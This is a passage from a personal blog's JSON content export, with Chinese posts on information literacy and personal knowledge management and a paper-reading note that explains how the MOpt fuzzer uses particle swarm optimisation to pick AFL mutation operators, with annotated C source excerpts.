file</strong><br>\n*search term here* filetype:pdf</p>\n</li>\n<li>\n<p><strong>Money and unit conversions</strong><br>\nmiles to km – This will convert miles to kilometers. You can put numbers in front to convert a certain number. Like “10 miles to km” will show you how many kilometers are in 10 miles. USD to British Pound Sterling – This will convert a US dollar to British pounds. Like the measurements above, you can add numbers to find exact conversions for a certain amount of money.</p>\n</li>\n<li>\n<p><strong>Track your packages</strong></p>\n</li>\n</ul>\n<h4 id=\"2-本地搜索软件\">2.本地搜索软件</h4>\n<ul>\n<li>Everything</li>\n</ul>\n<h4 id=\"3-各类网站\">3.各类网站</h4>\n<ul>\n<li>\n<p><a href=\"https://stackoverflow.com/\">StackOverflow</a><br>\n编程相关问答社区，编程相关问题回答质量高、解决概率大，提问需要遵守相关规范</p>\n</li>\n<li>\n<p><a href=\"https://plato.stanford.edu/\">Stanford Encyclopedia of Philosophy</a><br>\n斯坦福大学的一个哲学名词解释库</p>\n</li>\n<li>\n<p><a href=\"https://www.quora.com/\">Quora</a><br>\n综合类问答社区，宽泛性问题可以一观</p>\n</li>\n<li>\n<p><a href=\"https://www.zhihu.com/hot\">知乎</a><br>\n综合类问答社区，趣味性问题可以一观</p>\n</li>\n<li>\n<p><a href=\"https://wuu.wikipedia.org/\">WiKi</a><br>\n著名百科类网站</p>\n</li>\n<li>\n<p><a href=\"https://zh.wikihow.com/\">WikiHow</a><br>\n没有什么用但是很有趣的生活小妙招</p>\n</li>\n</ul>\n<h2 id=\"被动获取\">被动获取</h2>\n<p>主动获取的局限性是你不可能获取你不知道的知识，所以被动获取就很有必要了</p>\n<h4 id=\"1-RSS\">1. RSS</h4>\n<p>本人使用gReader<br>\n整合了各类新闻和相关论坛</p>\n"},{"title":"信息素养[2]-信息管理","date":"2022-02-19T16:00:00.000Z","toc":true,"sidebar":"none","_content":"\n\n\n\n\n# 信息管理\n\n当获取信息后，其次的任务就是对信息的管理以及处理，而信息管理的前提就是信息分类\n\n## 信息分类\n\n```mermaid\ngraph LR\n\t信息分类---离散信息-->孤立的碎片化信息\n\t信息分类---过程信息-->某些具体操作过程\n\t信息分类---观点信息-->评论/态度/观点\n\t信息分类---体系信息-->体系化知识\n\t信息分类---抽象信息-->抽象的概念信息\n```\n\n## 信息处理\n\n对于我个人的信息管理体系：\n\n- **Zotero**\n  用于论文网页等的留档以及管理\n- **思源笔记**\n  集合了双链和体系化笔记的功能，便于个人知识体系的形成\n- **MicrosoftEdge收藏**\n  各种实用网页索引，以前各种页面网站的各自的收藏混杂，导致管理混乱，于是决定统一将网页交由浏览器收藏管理\n- **博客**\n  个人信息的体系化/离散输出，实践的记录\n- **GitHub**\n  可复用代码，脚本的管理，以及开源程序的关注\n\n同时，在以上管理体系的基础上，我同时还在推进个人信息备份工作。包括本地备份、远程备份，最近租了一个服务器，预备进行数据备份工作，主要应对互联网上经常会有的删帖一些现象，防止信息丢失\n\n#### 1.离散信息\n\n对于离散信息，及一些论文、文章之类的我的管理如下\n\n- 用Zotero归档，形成备份\n- 思源笔记上提取主要观点记录成离散笔记--记录相关tag\n- 定时将相同领域的双链连接的离散知识进行逻辑性整合，写成博客输出\n\n#### 2.过程信息\n\n即一些操作记录，如服务器配置。某软件使用\n\n- 思源笔记记录\n- 自行实验，用博文记录过程\n\n#### 3.观点信息\n\n一些观点/评论\n\n- 用Zotero归档\n- 思源笔记整理，用表格化结构化的组织方法记录\n- 在需要时进行可视化处理和分析，整理成文章输出\n\n//这个点其实是偏人文社科领域的研究方法，实际上，我还没有实际对观点信息进行操作，需要留待以后完善\n\n#### 4.体系知识\n\n一个领域的体系化的知识，典型的如书籍和课程\n\n- 思源笔记写作逻辑化体系笔记\n- 定时复习\n\n#### 5.抽象信息\n\n- Zotera归档\n- 内化/比喻法","source":"_posts/信息素养[2]-信息管理.md","raw":"---\ntitle: 信息素养[2]-信息管理\ndate: 2022-2-20\ntags: \n- 信息素养\n\ncategories:\n- 杂项\n\ntoc: true # 是否启用内容索引\nsidebar: none # 是否启用sidebar侧边栏，none：不启用\n---\n\n\n\n\n\n# 信息管理\n\n当获取信息后，其次的任务就是对信息的管理以及处理，而信息管理的前提就是信息分类\n\n## 信息分类\n\n```mermaid\ngraph LR\n\t信息分类---离散信息-->孤立的碎片化信息\n\t信息分类---过程信息-->某些具体操作过程\n\t信息分类---观点信息-->评论/态度/观点\n\t信息分类---体系信息-->体系化知识\n\t信息分类---抽象信息-->抽象的概念信息\n```\n\n## 信息处理\n\n对于我个人的信息管理体系：\n\n- **Zotero**\n  用于论文网页等的留档以及管理\n- **思源笔记**\n  集合了双链和体系化笔记的功能，便于个人知识体系的形成\n- **MicrosoftEdge收藏**\n  各种实用网页索引，以前各种页面网站的各自的收藏混杂，导致管理混乱，于是决定统一将网页交由浏览器收藏管理\n- **博客**\n  个人信息的体系化/离散输出，实践的记录\n- **GitHub**\n  可复用代码，脚本的管理，以及开源程序的关注\n\n同时，在以上管理体系的基础上，我同时还在推进个人信息备份工作。包括本地备份、远程备份，最近租了一个服务器，预备进行数据备份工作，主要应对互联网上经常会有的删帖一些现象，防止信息丢失\n\n#### 1.离散信息\n\n对于离散信息，及一些论文、文章之类的我的管理如下\n\n- 用Zotero归档，形成备份\n- 思源笔记上提取主要观点记录成离散笔记--记录相关tag\n- 定时将相同领域的双链连接的离散知识进行逻辑性整合，写成博客输出\n\n#### 2.过程信息\n\n即一些操作记录，如服务器配置。某软件使用\n\n- 思源笔记记录\n- 自行实验，用博文记录过程\n\n#### 3.观点信息\n\n一些观点/评论\n\n- 用Zotero归档\n- 思源笔记整理，用表格化结构化的组织方法记录\n- 在需要时进行可视化处理和分析，整理成文章输出\n\n//这个点其实是偏人文社科领域的研究方法，实际上，我还没有实际对观点信息进行操作，需要留待以后完善\n\n#### 4.体系知识\n\n一个领域的体系化的知识，典型的如书籍和课程\n\n- 思源笔记写作逻辑化体系笔记\n- 定时复习\n\n#### 5.抽象信息\n\n- Zotera归档\n- 内化/比喻法","slug":"信息素养[2]-信息管理","published":1,"updated":"2022-06-29T15:48:42.685Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl6g6maji000sj8v071mi7znu","content":"<h1 id=\"信息管理\">信息管理</h1>\n<p>当获取信息后，其次的任务就是对信息的管理以及处理，而信息管理的前提就是信息分类</p>\n<h2 id=\"信息分类\">信息分类</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">\t信息分类---离散信息--&gt;孤立的碎片化信息</span><br><span class=\"line\">\t信息分类---过程信息--&gt;某些具体操作过程</span><br><span class=\"line\">\t信息分类---观点信息--&gt;评论/态度/观点</span><br><span class=\"line\">\t信息分类---体系信息--&gt;体系化知识</span><br><span class=\"line\">\t信息分类---抽象信息--&gt;抽象的概念信息</span><br></pre></td></tr></table></figure>\n<h2 id=\"信息处理\">信息处理</h2>\n<p>对于我个人的信息管理体系：</p>\n<ul>\n<li><strong>Zotero</strong><br>\n用于论文网页等的留档以及管理</li>\n<li><strong>思源笔记</strong><br>\n集合了双链和体系化笔记的功能，便于个人知识体系的形成</li>\n<li><strong>MicrosoftEdge收藏</strong><br>\n各种实用网页索引，以前各种页面网站的各自的收藏混杂，导致管理混乱，于是决定统一将网页交由浏览器收藏管理</li>\n<li><strong>博客</strong><br>\n个人信息的体系化/离散输出，实践的记录</li>\n<li><strong>GitHub</strong><br>\n可复用代码，脚本的管理，以及开源程序的关注</li>\n</ul>\n<p>同时，在以上管理体系的基础上，我同时还在推进个人信息备份工作。包括本地备份、远程备份，最近租了一个服务器，预备进行数据备份工作，主要应对互联网上经常会有的删帖一些现象，防止信息丢失</p>\n<h4 id=\"1-离散信息\">1.离散信息</h4>\n<p>对于离散信息，及一些论文、文章之类的我的管理如下</p>\n<ul>\n<li>用Zotero归档，形成备份</li>\n<li>思源笔记上提取主要观点记录成离散笔记–记录相关tag</li>\n<li>定时将相同领域的双链连接的离散知识进行逻辑性整合，写成博客输出</li>\n</ul>\n<h4 id=\"2-过程信息\">2.过程信息</h4>\n<p>即一些操作记录，如服务器配置。某软件使用</p>\n<ul>\n<li>思源笔记记录</li>\n<li>自行实验，用博文记录过程</li>\n</ul>\n<h4 id=\"3-观点信息\">3.观点信息</h4>\n<p>一些观点/评论</p>\n<ul>\n<li>用Zotero归档</li>\n<li>思源笔记整理，用表格化结构化的组织方法记录</li>\n<li>在需要时进行可视化处理和分析，整理成文章输出</li>\n</ul>\n<p>//这个点其实是偏人文社科领域的研究方法，实际上，我还没有实际对观点信息进行操作，需要留待以后完善</p>\n<h4 id=\"4-体系知识\">4.体系知识</h4>\n<p>一个领域的体系化的知识，典型的如书籍和课程</p>\n<ul>\n<li>思源笔记写作逻辑化体系笔记</li>\n<li>定时复习</li>\n</ul>\n<h4 id=\"5-抽象信息\">5.抽象信息</h4>\n<ul>\n<li>Zotera归档</li>\n<li>内化/比喻法</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"信息管理\">信息管理</h1>\n<p>当获取信息后，其次的任务就是对信息的管理以及处理，而信息管理的前提就是信息分类</p>\n<h2 id=\"信息分类\">信息分类</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">\t信息分类---离散信息--&gt;孤立的碎片化信息</span><br><span class=\"line\">\t信息分类---过程信息--&gt;某些具体操作过程</span><br><span class=\"line\">\t信息分类---观点信息--&gt;评论/态度/观点</span><br><span class=\"line\">\t信息分类---体系信息--&gt;体系化知识</span><br><span class=\"line\">\t信息分类---抽象信息--&gt;抽象的概念信息</span><br></pre></td></tr></table></figure>\n<h2 id=\"信息处理\">信息处理</h2>\n<p>对于我个人的信息管理体系：</p>\n<ul>\n<li><strong>Zotero</strong><br>\n用于论文网页等的留档以及管理</li>\n<li><strong>思源笔记</strong><br>\n集合了双链和体系化笔记的功能，便于个人知识体系的形成</li>\n<li><strong>MicrosoftEdge收藏</strong><br>\n各种实用网页索引，以前各种页面网站的各自的收藏混杂，导致管理混乱，于是决定统一将网页交由浏览器收藏管理</li>\n<li><strong>博客</strong><br>\n个人信息的体系化/离散输出，实践的记录</li>\n<li><strong>GitHub</strong><br>\n可复用代码，脚本的管理，以及开源程序的关注</li>\n</ul>\n<p>同时，在以上管理体系的基础上，我同时还在推进个人信息备份工作。包括本地备份、远程备份，最近租了一个服务器，预备进行数据备份工作，主要应对互联网上经常会有的删帖一些现象，防止信息丢失</p>\n<h4 id=\"1-离散信息\">1.离散信息</h4>\n<p>对于离散信息，及一些论文、文章之类的我的管理如下</p>\n<ul>\n<li>用Zotero归档，形成备份</li>\n<li>思源笔记上提取主要观点记录成离散笔记–记录相关tag</li>\n<li>定时将相同领域的双链连接的离散知识进行逻辑性整合，写成博客输出</li>\n</ul>\n<h4 id=\"2-过程信息\">2.过程信息</h4>\n<p>即一些操作记录，如服务器配置。某软件使用</p>\n<ul>\n<li>思源笔记记录</li>\n<li>自行实验，用博文记录过程</li>\n</ul>\n<h4 id=\"3-观点信息\">3.观点信息</h4>\n<p>一些观点/评论</p>\n<ul>\n<li>用Zotero归档</li>\n<li>思源笔记整理，用表格化结构化的组织方法记录</li>\n<li>在需要时进行可视化处理和分析，整理成文章输出</li>\n</ul>\n<p>//这个点其实是偏人文社科领域的研究方法，实际上，我还没有实际对观点信息进行操作，需要留待以后完善</p>\n<h4 id=\"4-体系知识\">4.体系知识</h4>\n<p>一个领域的体系化的知识，典型的如书籍和课程</p>\n<ul>\n<li>思源笔记写作逻辑化体系笔记</li>\n<li>定时复习</li>\n</ul>\n<h4 id=\"5-抽象信息\">5.抽象信息</h4>\n<ul>\n<li>Zotera归档</li>\n<li>内化/比喻法</li>\n</ul>\n"},{"title":"信息素养[3]-信息运用与杂谈","date":"2022-02-19T16:00:00.000Z","toc":true,"sidebar":"none","_content":"\n\n\n\n\n# 信息运用\n\n就我个人而言，我觉得信息素养最重要的，还是要学会将信息进行运用，将信息内化为自身的能力\n\n我以为较好的运用方法：\n\n- **写博客**\n  实际上是将相关信息在体系化整理，类似于费曼学习法\n- **做项目/实验**\n  做项目，实验，切实运用\n- **数据分析**\n  目前还未打算涉及\n- **竞赛**\n  如CTF、ACM等各类竞赛\n- **实习**\n  了解生产环境\n\n就目前而言，我觉得我这方面的能力是很欠缺的，所以接下来应该将会深化这方面的能力\n\n\n\n# 杂谈\n\n信息素养是我一直在刻意培养的一种能力。就我个人而言，我觉得，如果要说我人生的前十几年除了无所事事还做成了什么，那就只能是一种体系化结构化的思维和对更高效率以及能力的追求的，这可以说是我个人的一点强迫症，我会习惯性的将各种流程和信息抽象成结构化的思考，进而提升学习工作效率。\n这一系列文章就是这种思维的成果。\n\n但在某种意义上，这也对我形成了一定的障碍，导致我对于离散信息的利用率很低，对于不成体系化的信息习惯性的忽略，同时限制了我的联想思维。然后在朋友的推荐下接触了双链笔记，在今后，我应该会在这方面在进一步","source":"_posts/信息素养[3]-信息运用与杂谈.md","raw":"---\ntitle: 信息素养[3]-信息运用与杂谈\ndate: 2022-2-20\ntags: \n- 信息素养\n\ncategories:\n- 杂项\n\ntoc: true # 是否启用内容索引\nsidebar: none # 是否启用sidebar侧边栏，none：不启用\n---\n\n\n\n\n\n# 信息运用\n\n就我个人而言，我觉得信息素养最重要的，还是要学会将信息进行运用，将信息内化为自身的能力\n\n我以为较好的运用方法：\n\n- **写博客**\n  实际上是将相关信息在体系化整理，类似于费曼学习法\n- **做项目/实验**\n  做项目，实验，切实运用\n- **数据分析**\n  目前还未打算涉及\n- **竞赛**\n  如CTF、ACM等各类竞赛\n- **实习**\n  了解生产环境\n\n就目前而言，我觉得我这方面的能力是很欠缺的，所以接下来应该将会深化这方面的能力\n\n\n\n# 杂谈\n\n信息素养是我一直在刻意培养的一种能力。就我个人而言，我觉得，如果要说我人生的前十几年除了无所事事还做成了什么，那就只能是一种体系化结构化的思维和对更高效率以及能力的追求的，这可以说是我个人的一点强迫症，我会习惯性的将各种流程和信息抽象成结构化的思考，进而提升学习工作效率。\n这一系列文章就是这种思维的成果。\n\n但在某种意义上，这也对我形成了一定的障碍，导致我对于离散信息的利用率很低，对于不成体系化的信息习惯性的忽略，同时限制了我的联想思维。然后在朋友的推荐下接触了双链笔记，在今后，我应该会在这方面在进一步","slug":"信息素养[3]-信息运用与杂谈","published":1,"updated":"2022-06-29T15:49:41.528Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl6g6majj000vj8v0dyz5bnbo","content":"<h1 id=\"信息运用\">信息运用</h1>\n<p>就我个人而言，我觉得信息素养最重要的，还是要学会将信息进行运用，将信息内化为自身的能力</p>\n<p>我以为较好的运用方法：</p>\n<ul>\n<li><strong>写博客</strong><br>\n实际上是将相关信息在体系化整理，类似于费曼学习法</li>\n<li><strong>做项目/实验</strong><br>\n做项目，实验，切实运用</li>\n<li><strong>数据分析</strong><br>\n目前还未打算涉及</li>\n<li><strong>竞赛</strong><br>\n如CTF、ACM等各类竞赛</li>\n<li><strong>实习</strong><br>\n了解生产环境</li>\n</ul>\n<p>就目前而言，我觉得我这方面的能力是很欠缺的，所以接下来应该将会深化这方面的能力</p>\n<h1 id=\"杂谈\">杂谈</h1>\n<p>信息素养是我一直在刻意培养的一种能力。就我个人而言，我觉得，如果要说我人生的前十几年除了无所事事还做成了什么，那就只能是一种体系化结构化的思维和对更高效率以及能力的追求的，这可以说是我个人的一点强迫症，我会习惯性的将各种流程和信息抽象成结构化的思考，进而提升学习工作效率。<br>\n这一系列文章就是这种思维的成果。</p>\n<p>但在某种意义上，这也对我形成了一定的障碍，导致我对于离散信息的利用率很低，对于不成体系化的信息习惯性的忽略，同时限制了我的联想思维。然后在朋友的推荐下接触了双链笔记，在今后，我应该会在这方面在进一步</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"信息运用\">信息运用</h1>\n<p>就我个人而言，我觉得信息素养最重要的，还是要学会将信息进行运用，将信息内化为自身的能力</p>\n<p>我以为较好的运用方法：</p>\n<ul>\n<li><strong>写博客</strong><br>\n实际上是将相关信息在体系化整理，类似于费曼学习法</li>\n<li><strong>做项目/实验</strong><br>\n做项目，实验，切实运用</li>\n<li><strong>数据分析</strong><br>\n目前还未打算涉及</li>\n<li><strong>竞赛</strong><br>\n如CTF、ACM等各类竞赛</li>\n<li><strong>实习</strong><br>\n了解生产环境</li>\n</ul>\n<p>就目前而言，我觉得我这方面的能力是很欠缺的，所以接下来应该将会深化这方面的能力</p>\n<h1 id=\"杂谈\">杂谈</h1>\n<p>信息素养是我一直在刻意培养的一种能力。就我个人而言，我觉得，如果要说我人生的前十几年除了无所事事还做成了什么，那就只能是一种体系化结构化的思维和对更高效率以及能力的追求的，这可以说是我个人的一点强迫症，我会习惯性的将各种流程和信息抽象成结构化的思考，进而提升学习工作效率。<br>\n这一系列文章就是这种思维的成果。</p>\n<p>但在某种意义上，这也对我形成了一定的障碍，导致我对于离散信息的利用率很低，对于不成体系化的信息习惯性的忽略，同时限制了我的联想思维。然后在朋友的推荐下接触了双链笔记，在今后，我应该会在这方面在进一步</p>\n"},{"title":"PaperReading-Fuzz-MOpt","date":"2022-08-16T16:00:00.000Z","toc":true,"sidebar":"none","_content":"\n\n\n# MOPT\n\nMOpt是针对传统Mutation based fuzz的变异策略的一种改进Fuzzer，主要通过PSO算法优化了变异操作的选取\n\n## 0x1.核心思路\n\n### 0x1.1.传统Fuzz的变异策略存在的问题\n\n- Different operators’ efficiency varies.\n  不同Mutation operators的效率不同\n- One operator’s efficiency varies with target programs.\n- One operator’s efficiency varies over time.\n- The scheduler incurs performance overhead.\n- Unbalanced data for machine learning.\n\n这些问题，要求我们用更智能化的方法选择各种Mutation operators\n\n### 0x1.2.MOpt\n\n将每个Mutation operators视为PSO中的一个particle，寻找其最佳概率\n\n\n\n#### 0x1.2.1.一些参数\n\n- L~best~ : particle在概率空间中的最佳(对应的优秀测试用例更多)分布\n- G~best~ : 区别于传统粒子群算法，在计算时，实际上所有particle分布在不同的概率空间，不可能存在一个传统意义上的适应于所有particle的G~best~，那么同样从全局意义考虑，将所有particle对应的interesting test cases数量之和，作为整个swarm的globel~eff~，而每个partcle在globel~eff~ 中的比例，作为其对应的G~best~\n\n#### 0x1.2.2.overview\n\n在每一次fuzz过程中额外的三个task:\n\n- 更新每个particle的L~best~ 为效率最高的eff~best~\n- 更新每个particle的G~best~\n- 选择最好的swarm指导fuzzing(避免陷入局部最优点)  // 一个疑问\n\n同时，在每次迭代最后，还要按照PSO算法，更行每个particle的position\n\n```tex\nvnow[Si][Pj] ←w × vnow[Si][Pj] \n    \t\t+r × (Lbest [Si][Pj] − xnow[Si][Pj]) \n    \t\t+r × (Gbest [Pj] − xnow[Si][Pj]). (3) \n    \nxnow[Si][Pj] ← xnow[Si][Pj] + vnow[Si][Pj]. (4)\n```\n\n#### 0x1.2.3.Main Framework\n\n**PSO Initialization Module:**\n\n负责PSO相关参数的初始化:\n\n- 设置每个swarm中的每个particle的*X~now~* 为随机值，并保证每个群中的X~now~之和为1\n- 把每个particle的*V~now~*设置为0.1\n- 设置每个particle的*eff~now~*为0\n- 设置每个particle的*G~best~*和*L~best~*为0.5\n\n**Pilot Fuzzing Module**\n\n对多个swarm找最优概率分布\n\n**Core Fuzzing Module**\n\n针对一个swarm找最优概率分布\n\n**PSO Updating Module**\n\n根据PSO算法迭代*V~now~*和*X~now~*\n\n**Pacemaker Fuzzing Mode**\n\n主要是针对Mutation based fuzz的deterministic stage，对于特定的条件，酌情跳过，deterministic stage，以提高效率。\n\n对于上述模块的具体分析放在源代码分析中。\n\n## 0x2.源代码分析\n\n主要分析相对于AFL算法所作的改进， 以源代码中的中文注释为主要形式\n\n\n\n差异部分:\n\n原调用链：\n\nmain->fuzz_one\n\n现调用链:\n\nmain->fuzz_one->normal_fuzz / pivot_fuzz / core_fuzz / pso_update\n\n主要更改了afl-fuzz.c->fuzz_one->havoc环节的逻辑\n\n\n\n整体思路(红线部分为我自己添加的MOpt思路，原图来自MOpt原论文，表明AFL的mutatition stage):\n\n![MOpt](./MOpt.png)\n\n### 0x2.1.main()\n\n关注主要逻辑，根据需要，选择性的忽视了一些无关主要逻辑的代码\n\n**新增参数判断**\n\n-L 参数负责控制转入Pacemaker Fuzzing Mode的时间。\n\n```c\n\n        case 'L': { /* MOpt mode */\n\t\t// L 参数负责控制转入Pacemaker Fuzzing Mode的时间\n        // -L 30 相当于24小时左右\n        // ref: https://github.com/puppet-meteor/MOpt-AFL\n            //if (limit_time_sig)  FATAL(\"Multiple -L options not supported\");\n            limit_time_sig = 1;\n\t\t\t// \n\t\t\tif (sscanf(optarg, \"%llu\", &limit_time_puppet) < 1 ||\n\t\t\t\toptarg[0] == '-') FATAL(\"Bad syntax used for -L\");\n\n\t\t\tu64 limit_time_puppet2 = limit_time_puppet * 60 * 1000;\n\n\t\t\tif (limit_time_puppet2 < limit_time_puppet ) FATAL(\"limit_time overflow\");\n\t\t\t\tlimit_time_puppet = limit_time_puppet2;\n\n\t\t\tSAYF(\"limit_time_puppet %llu\\n\",limit_time_puppet);\n\n\t\t\tif (limit_time_puppet == 0 )\n\t\t\t    key_puppet = 1;\n\n\n        }\n        break;\n```\n\n**针对MOpt的全局变量的初始化**\n\n对应于前文的**PSO Initialization Module** 具体内容可以查看前文\n\n```c\n  {                //initialize swarms\n        int i;\n        int tmp_swarm = 0;\n        swarm_now = 0;\n\n        if (g_now > g_max) g_now = 0;\n                w_now = (w_init - w_end)*(g_max - g_now) / (g_max)+w_end;\n\n        for (tmp_swarm = 0; tmp_swarm < swarm_num; tmp_swarm++)\n        {\n                double total_puppet_temp = 0.0;\n                swarm_fitness[tmp_swarm] = 0.0;\n\n                for (i = 0; i < operator_num; i++)\n                {\n                        stage_finds_puppet[tmp_swarm][i] = 0;\n                        probability_now[tmp_swarm][i] = 0.0;\n                        x_now[tmp_swarm][i] = ((double)(random() % 7000)*0.0001 + 0.1);\n                        total_puppet_temp += x_now[tmp_swarm][i];\n                        v_now[tmp_swarm][i] = 0.1;\n                        L_best[tmp_swarm][i] = 0.5;\n                        G_best[i] = 0.5;\n                        eff_best[tmp_swarm][i] = 0.0;\n\n                }\n\n\n                for (i = 0; i < operator_num; i++) {\n                        stage_cycles_puppet_v2[tmp_swarm][i] = stage_cycles_puppet[tmp_swarm][i];\n                        stage_finds_puppet_v2[tmp_swarm][i] = stage_finds_puppet[tmp_swarm][i];\n                        x_now[tmp_swarm][i] = x_now[tmp_swarm][i] / total_puppet_temp;\n                }\n\n                double x_temp = 0.0;\n\n                for (i = 0; i < operator_num; i++)\n                {\n                        probability_now[tmp_swarm][i] = 0.0;\n                        v_now[tmp_swarm][i] = w_now * v_now[tmp_swarm][i] + RAND_C * (L_best[tmp_swarm][i] - x_now[tmp_swarm][i]) + RAND_C * (G_best[i] - x_now[tmp_swarm][i]);\n\n                        x_now[tmp_swarm][i] += v_now[tmp_swarm][i];\n\n                        if (x_now[tmp_swarm][i] > v_max)\n                                x_now[tmp_swarm][i] = v_max;\n                        else if (x_now[tmp_swarm][i] < v_min)\n                                x_now[tmp_swarm][i] = v_min;\n\n                        x_temp += x_now[tmp_swarm][i];\n                }\n\n                for (i = 0; i < operator_num; i++)\n                {\n                        x_now[tmp_swarm][i] = x_now[tmp_swarm][i] / x_temp;\n                        if (likely(i != 0))\n                                probability_now[tmp_swarm][i] = probability_now[tmp_swarm][i - 1] + x_now[tmp_swarm][i];\n                        else\n                                probability_now[tmp_swarm][i] = x_now[tmp_swarm][i];\n                }\n                if (probability_now[tmp_swarm][operator_num - 1] < 0.99 || probability_now[tmp_swarm][operator_num - 1] > 1.01)\n                    FATAL(\"ERROR probability\");\n        }\n\n        for (i = 0; i < operator_num; i++)\n        {\n                core_operator_finds_puppet[i] = 0;\n                core_operator_finds_puppet_v2[i] = 0;\n                core_operator_cycles_puppet[i] = 0;\n                core_operator_cycles_puppet_v2[i] = 0;\n                core_operator_cycles_puppet_v3[i] = 0;\n        }\n  }\n```\n\n### 0x2.2.select_algorithm()\n\n根据PSO获得的概率分布，选择不同的变异算法\n\n```c\nint select_algorithm(int extras) {\n\n  int i_puppet, j_puppet;\n  //double total_puppet = 0.0;\n//srandom(time(NULL));\n\n    u32 seed[2];\n\n    ck_read(dev_urandom_fd, &seed, sizeof(seed), \"/dev/urandom\");\n\n    srandom(seed[0]);\n\n  //double sele = ((double)(random()%10000)*0.0001);\n  //SAYF(\"select : %f\\n\",sele);\n  j_puppet = 0;\n  int operator_number = operator_num;\n  if (extras < 2) operator_number = operator_number - 2;\n  double range_sele = (double)probability_now[swarm_now][operator_number - 1];\n  double sele = ((double)(random() % 10000) * 0.0001 * range_sele);\n    \n// 这里的probability_now由pso_uadating()确定\n// probability_now是一个概率的前缀和数组，\n// 最后一位也就是probability_now[swarm_now][operator_number - 1]应该为1\n    \n  for (i_puppet = 0; i_puppet < operator_number; i_puppet++)\n  {\n      if (unlikely(i_puppet == 0))\n      {\n          if (sele < probability_now[swarm_now][i_puppet])\n            break;\n      }\n      else\n      {\n          if (sele < probability_now[swarm_now][i_puppet])\n          {\n              j_puppet =1;\n              break;\n          }\n      }\n  }\n    \n  // 由上面对于sele的分析，可以知道这里是按照对应的概率设置i_puppet\n  // i_puppet对应选择到的操作\n    \n  if ((j_puppet ==1 && sele < probability_now[swarm_now][i_puppet-1]) || (i_puppet + 1 < operator_num && sele > probability_now[swarm_now][i_puppet +  1]))\n    FATAL(\"error select_algorithm\");\n  return i_puppet;\n}\n```\n\n### 0x2.2.fuzz_one()\n\nfuzz_one() 是完成Mutation operators的核心流程，在main()中每一次fuzz循环中被调用\n\n```c\nstatic u8 fuzz_one(char** argv) {\n\tint key_val_lv = 0;\n\tif (limit_time_sig == 0)\n\t\tkey_val_lv = normal_fuzz_one(argv);\n    \t// normal_fuzz_one() 是原来AFL的fuzz_one()\n\telse\n\t{\n\t\tif (key_module == 0)\n\t\t\tkey_val_lv = pilot_fuzzing(argv);\n        \t// 对应0x1.2.3.Main Framework 中的pilot fuzzing module\n\t\telse if (key_module == 1)\n\t\t\tkey_val_lv = core_fuzzing(argv);\n        \t// 对应core fuzzing module\n\t\telse if (key_module == 2)\n\t\t\tpso_updating();\n        \t// 对应PSO updating module\n\t}\n\n\treturn key_val_lv;\t\n}\n```\n\n### 0x2.3.pilot_fuzzing()\n\n这是整个MOpt的核心模块，他是在原AFL的基础上修改得到的，所以主要分析和原AFL的差异部分。\n\ncore_pilot与此类似，所以不做单独分析\n\n#### 0x2.3.1.Pacemaker Fuzzing Mode\n\n由于deterministic stage的小型改动在前期比较有用，在后期长时间处于deterministic stage会导致效率下降，所以在原fuzz_one() 直接跳到havoc_stage() 的逻辑后面，增加一个时间判断，判断是否要直接跳到havoc_stage()\n\n```c\n// line 6999 in afl_fuzz.c\n\ncur_ms_lv = get_cur_time();\n// 获取当前时间\nif (!(key_puppet == 0 && ((cur_ms_lv - last_path_time < limit_time_puppet) \n        (last_crash_time != 0 && cur_ms_lv - last_crash_time < limit_time_puppet) || last_path_time == 0)))\n// 如果距离上一次crash或者找到新路径的时间，超过了通过-L参数设置的limit_time_puppet\n// 说明长时间陷入了deterministic stage\n// 直接跳过deterministic stage进入havoc_stage()\n{\n        key_puppet = 1;\n        goto pacemaker_fuzzing;\n}\n```\n\n\n\n#### 0x2.3.2.Mutation operators select\n\n在havoc阶段，要进行变异策略的选择，相比于原来的随机选择，MOpt根据PSO得到的概率分布进行策略的选择\n\n```c\n// line 8165 in afl-fuzz.c\n\nswitch (select_algorithm( extras_cnt + a_extras_cnt )) \n```\n\n#### 0x2.3.3.Before return\n\n返回前新增的一些变化\n\n```c\nif (key_puppet == 1)\n//一个小型的flag\n//在前面pacemaker的跳转时被设置为1\n{\n        if (unlikely(queued_paths + unique_crashes > ((queued_paths + unique_crashes)*limit_time_bound + orig_hit_cnt_puppet)))\n        {\n                key_puppet = 0;\n                cur_ms_lv = get_cur_time();\n                new_hit_cnt = queued_paths + unique_crashes;\n                orig_hit_cnt_puppet = 0;\n                last_limit_time_start = 0;\n        }\n}\n// 还原并更新一些变量\n\nif (unlikely(tmp_pilot_time > period_pilot))\n{\n        total_pacemaker_time += tmp_pilot_time;\n        new_hit_cnt = queued_paths + unique_crashes;\n        swarm_fitness[swarm_now] = (double)(total_puppet_find - temp_puppet_find) / ((double)(tmp_pilot_time)/ period_pilot_tmp);\n        tmp_pilot_time = 0;\n        temp_puppet_find = total_puppet_find;\n\n        u64 temp_stage_finds_puppet = 0;\n        for (i = 0; i < operator_num; i++)\n        {\n                double temp_eff = 0.0;\n\n                if (stage_cycles_puppet_v2[swarm_now][i] > stage_cycles_puppet[swarm_now][i])\n                        temp_eff = (double)(stage_finds_puppet_v2[swarm_now][i] - stage_finds_puppet[swarm_now][i]) /\n                        (double)(stage_cycles_puppet_v2[swarm_now][i] - stage_cycles_puppet[swarm_now][i]);\n                if (eff_best[swarm_now][i] < temp_eff)\n                {\n                        eff_best[swarm_now][i] = temp_eff;\n                        L_best[swarm_now][i] = x_now[swarm_now][i];\n                }\n            \t// 找到particle对应的历史最优概率分布\n\t\t\t\t// 更新L_best\n                stage_finds_puppet[swarm_now][i] = stage_finds_puppet_v2[swarm_now][i];\n                stage_cycles_puppet[swarm_now][i] = stage_cycles_puppet_v2[swarm_now][i];\n                